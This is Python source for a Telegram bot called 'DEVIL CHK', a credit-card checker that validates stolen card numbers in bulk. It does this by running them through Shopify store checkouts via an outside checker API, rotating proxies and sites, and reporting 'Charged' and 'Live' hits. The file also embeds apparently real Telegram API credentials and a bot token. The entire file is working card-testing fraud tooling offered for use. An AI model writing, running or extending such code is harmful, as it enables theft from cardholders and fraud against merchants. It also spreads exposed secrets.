from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

# 🔗 رابط الـ API الجديد لـ Shopify
CHECKER_API_URL = 'https://afuona.up.railway.app/shopify'

# Premium Custom Emoji IDs
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",   # ✨ Multi Sparkles / Celebration
    "🔥": "5999340396432333728",   # 🔥 Purple Flame Heart
    "❌": "6037570896766438989",   # 💀 White Skull (Dark Glow)
    "⚡": "6026367225466720832",   # ⚡ Yellow Lightning Bolt
    "💳": "5971944878815317190",   # 💫 Floating Color Dots
    "💠": "5971837723676249096",   # 🌀 Neon Circle Rings
    "📝": "6023660820544623088",   # ✨
    "🌐": "6026367225466720832",   # ⚡
    "🎯": "5974235702701853774",   # 🟠🟡🟢 Triple Ring Loader
    "🤖": "6057466460886799210",   # 😼 Dark Cat Face
    "🤵": "4949560993840629085",   # 🧠 Golden Maze
    "💰": "5971944878815317190",   # 💫
    "⏸️": "6001440193058444284",   # ⚙️ Arc Reactor
    "▶️": "6285315214673975495",   # ➡️ Neon Arrow Right
    "🛑": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "📊": "5971837723676249096",   # 🌀
    "📦": "6066395745139824604",   # 🎀 Neon Pink Bow
    "📋": "5974235702701853774",   # Triple Ring
    "🔄": "5971837723676249096",   # 🌀 Neon Circle Rings
    "⏳": "5971837723676249096",   # 🌀
    "🚀": "6282977077427702833",   # 🎉 Color Confetti
    "⚠️": "5420323339723881652",   # ⚠️ Red Warning Triangle
    "💎": "6023660820544623088",   # ✨
}

def premium_emoji(text):
    if not text:
        return text
    return text

# Configuration
API_ID = 39825025
API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
BOT_TOKEN = '7412552338:AAF_Xf2hy0lJ5hQQ_oP04BA7XzE8o30wAi4'

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        formatted_proxy = proxy
        if proxy and len(proxy.split(':')) == 4:
            p_parts = proxy.split(':')
            formatted_proxy = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"

        params = {
            'cc': card,
            'site': site,
            'proxy': formatted_proxy
        }
        
        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = 'Shopify Payments'
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

⚡ <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏𝐥_𝐯𝐢𝐩</a></b>"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    progress_text = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚ｔ𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏𝐥_𝐯𝐢𝐩</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r['message']}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r['message']}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r['message']}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        formatted_proxy = proxy
        if proxy and len(proxy.split(':')) == 4:
            p_parts = proxy.split(':')
            formatted_proxy = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"

        params = {'cc': test_card, 'site': site, 'proxy': formatted_proxy}
        timeout = aiohttp.ClientTimeout(total=40)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'site dead' in response_msg or 'invalid site' in response_msg or 'site errors' in response_msg:
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        formatted_proxy = proxy
        if proxy and len(proxy.split(':')) == 4:
            p_parts = proxy.split(':')
            formatted_proxy = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"

        params = {'cc': test_card, 'site': test_site_url, 'proxy': formatted_proxy}
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = raw.get('Response', '').lower()
        
        # توافق مع رد السيرفر الجديد لمنع ظهور إيرور سايت في فحص البروكسي
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'site errors' in response_msg or 'connection failed' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to DEVIL CHK ! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /site - Check all sites & remove dead\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy ip:port:user:pass - Add proxy\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /rmproxyindex 1,2,3 - Remove by index\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚠️ Only premium users can use this bot.</b>"
        ),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites or not proxies:
        await event.reply(premium_emoji("❌ No sites/proxies available."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format."), parse_mode='html')
        return

    card = cards[0]
    status_msg = await event.reply(f"<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n<blockquote>💳 Card: <code>{card}</code></blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>", parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=2)

        se, st = ("✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝") if result['status'] == 'Charged' else (("🔥", "𝐋𝐢𝐯𝐞") if result['status'] == 'Approved' else ("❌", "𝐃𝐞𝐚𝐝"))
        final_resp = f"""<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈延 𝐂𝐇𝐊  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑e𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{se} Status: {st}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=1707478010">ㅤㅤ𝐃𝟑𝐯𝟏λ_𝐯𝐢𝐩</a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(f"❌ Error: {e}")

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy: return
    
    status_msg = await event.reply(f"🔄 Checking proxy: <code>{proxy}</code>...", parse_mode='html')
    res = await test_proxy(proxy)
    if res['status'] == 'alive':
        await status_msg.edit(f"✅ <b>Proxy is ALIVE!</b>")
    else:
        await status_msg.edit(f"❌ <b>Proxy is DEAD!</b>")

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove: return
    
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies: return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(f"✅ <b>Proxy Removed!</b>")

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str: return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except: return

    current_proxies = load_proxies()
    new_proxies = [p for i, p in enumerate(current_proxies) if i not in indices]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(f"✅ <b>Proxies Removed by Index!</b>")

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply("✅ <b>Cleared all proxies!</b>")

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    current_proxies = load_proxies()
    if not current_proxies: return
    
    proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies[:50])])
    await event.reply(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    args = event.message.text.split('\n')
    if len(args) < 2: return
    
    proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
    current_proxies = load_proxies()
    new_proxies = [p for p in proxies_to_add if p not in current_proxies]
    
    if not new_proxies: return
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(f"✅ **Proxies Added Successfully!**")

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    args = event.message.text.split(' ', 1)
    if len(args) < 2: return
    
    url_to_remove = args[1].strip()
    current_sites = load_sites()
    if url_to_remove not in current_sites: return
    new_sites = [site for site in current_sites if site != url_to_remove]
    
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in new_sites:
            await f.write(f"{site}\n")
    await event.reply(f"✅ **Site Removed Successfully!**")

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    if not event.reply_to_msg_id: return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'): return

    status_msg = await event.reply("🫆 Processing your file...")
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)[:5000]
    os.remove(file_path)

    if not cards: return

    total_cards = len(cards)
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}
    queue = asyncio.Queue()
    for card in cards:
        queue.put_nowait(card)

    async def worker():
        while not queue.empty() and session_key in active_sessions:
            if active_sessions[session_key].get('paused'):
                await asyncio.sleep(1)
                continue
            try:
                card = queue.get_nowait()
            except:
                break
            
            res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=1)
            all_results['checked'] += 1
            
            if res['status'] == 'Charged':
                all_results['charged'].append(res)
                await send_realtime_hit(user_id, res, 'Charged', '')
            elif res['status'] == 'Approved':
                all_results['approved'].append(res)
                await send_realtime_hit(user_id, res, 'Approved', '')
            else:
                all_results['dead'].append(res)
            queue.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(15)]
    while workers:
        done, pending = await asyncio.wait(workers, timeout=1.0)
        workers = list(pending)

    if session_key in active_sessions:
        del active_sessions[session_key]
    try:
        await status_msg.delete()
    except:
        pass
    await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    sites, proxies = load_sites(), load_proxies()
    if not sites or not proxies: return
    
    status_msg = await event.reply(f"🔥 Checking {len(sites)} sites...")
    alive_sites, dead_sites = [], []
    
    for i in range(0, len(sites), 10):
        batch = sites[i:i + 10]
        tasks = [test_site(s, random.choice(proxies)) for s in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive_sites.append(res['site'])
            else:
                dead_sites.append(res['site'])
                
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive_sites:
            await f.write(f"{s}\n")
    await status_msg.edit(f"✅ **Site Check Complete!**\n\n**Total:** {len(sites)}\n**Alive:** {len(alive_sites)}\n**Removed:** {len(dead_sites)}")

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id): return
    proxies = load_proxies()
    if not proxies: return
    
    status_msg = await event.reply(f"🔥 Checking {len(proxies)} proxies...")
    alive_proxies, dead_proxies = [], []
    
    for i in range(0, len(proxies), 40):
        batch = proxies[i:i + 40]
        tasks = [test_proxy(p) for p in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive_proxies.append(res['proxy'])
            else:
                dead_proxies.append(res['proxy'])
        await status_msg.edit(f"🔥 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies)+len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}", parse_mode='html')
        
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive_proxies:
            await f.write(f"{p}\n")
    await status_msg.edit(f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}", parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    key = f"{event.sender_id}_{event.message_id}"
    if key in active_sessions: active_sessions[key]['paused'] = True
    await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    key = f"{event.sender_id}_{event.message_id}"
    if key in active_sessions: active_sessions[key]['paused'] = False
    await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    key = f"{event.sender_id}_{event.message_id}"
    if key in active_sessions:
        del active_sessions[key]
        await event.edit("😡 **Checking stopped by user.**")

print("✅ Server Started Smoothly!")
bot.run_until_disconnected()
